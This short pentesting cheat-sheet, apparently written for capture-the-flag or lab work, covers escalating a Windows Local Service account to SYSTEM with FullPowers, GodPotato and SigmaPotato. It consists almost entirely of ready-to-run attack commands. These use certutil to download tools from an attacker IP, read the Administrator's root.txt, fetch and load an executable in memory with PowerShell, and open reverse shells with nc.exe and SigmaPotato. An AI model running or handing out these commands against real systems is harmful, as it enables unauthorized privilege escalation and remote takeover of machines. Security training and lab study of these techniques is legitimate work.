# Local Service to SYSTEM

### A 'Service Account' to become a NT AUTHORITY/SYSTEM

[https://itm4n.github.io/localservice-privileges/](https://itm4n.github.io/localservice-privileges/)

{% code overflow="wrap" %}
```bash
# https://itm4n.github.io/localservice-privileges/
# With this tool, we can abuse a schedule task function to get the all default privilege back including the SeImpersonatePrivilege. 

CMD> FullPowers.exe
CMD> whoami /priv


# Got Potato
# https://github.com/BeichenDream/GodPotato
CMD> certutil -urlcache -split -f http://10.10.14.16/GodPotato-NET4.exe
CMD> GodPotato-NET4.exe -cmd "cmd /c whoami"
CMD> GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"

CMD> certutil -urlcache -split -f http://10.10.14.16/nc.exe
Kali> rlwrap nc -nlvp 1235
CMD> GodPotato-NET4.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.14.16 1235"

# SigmaPotato
# https://github.com/tylerdotrar/SigmaPotato
CMD> powershell
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://10.10.14.16/SigmaPotato.exe"))

Kali> rlwrap nc -nlvp 1236
CMD> [SigmaPotato]::Main(@("--revshell","10.10.14.16","1236"))
```
{% endcode %}
